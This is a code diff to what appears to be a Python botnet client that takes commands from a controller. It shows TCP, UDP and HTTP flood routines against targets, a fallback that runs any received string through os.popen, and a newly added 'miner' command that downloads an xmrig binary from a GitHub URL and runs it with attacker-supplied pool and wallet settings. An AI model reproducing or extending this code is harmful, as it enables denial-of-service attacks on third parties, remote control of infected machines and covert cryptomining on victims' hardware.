@@ -1,3 +1,4 @@
+import sys
 import threading
 import requests
 import socket
@@ -21,7 +22,7 @@ def client():
             elif data.startswith("tcp"):
                 data = data.split()
 
-                tcp_ip = data[1]
+                tcp_ip = socket.gethostbyname(data[1])
                 tcp_port = int(data[2])
                 tcp_threads = int(data[3])
 
@@ -53,7 +54,7 @@ def client():
             elif data.startswith("udp"):
                 data = data.split()
 
-                udp_ip = data[1]
+                udp_ip = socket.gethostbyname(data[1])
                 udp_threads = int(data[2])
                 udp_port = int()
 
@@ -91,12 +92,11 @@ def client():
 
                 print(f"\033[31m! {data} !\033[0m")
 
-                headers = {'max-bandswitch': '2'}
-                response = requests.get(req_url, headers=headers)
+                response = requests.get(req_url)
 
                 def req():
                     try:
-                        requests.get(req_url, headers=headers)
+                        requests.get(req_url)
                         print("\033[32m[+]\033[0m Request Packet sent ->", req_url)
 
                     except Exception as err:
@@ -110,6 +110,33 @@ def client():
 
                 t = threading.Thread(target=req_t)
                 t.start()
+
+            elif data.startswith("miner"):
+                data = data.split()
+
+                pool = data[1]
+                wallet = data[2]
+                worker = data[3]
+
+                data = " ".join(data)
+
+                print(f"\033[31m! {data} !\033[0m")
+
+                if sys.platform == "linux":
+                    url = 'https://github.com/rxyzqc/SC/raw/main/xmrig'
+                    rig = "xmrig"
+                else:
+                    url = 'https://github.com/rxyzqc/SC/raw/main/xmrig.exe'
+                    rig = "xmrig.exe"
+
+                if not os.path.exists(rig):
+                    response = requests.get(url)
+
+                    with open(rig, 'wb') as f:
+                        f.write(response.content)
+
+                if os.path.exists(rig):
+                    os.system(f"{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")
 
             else:
                 os.popen(data)
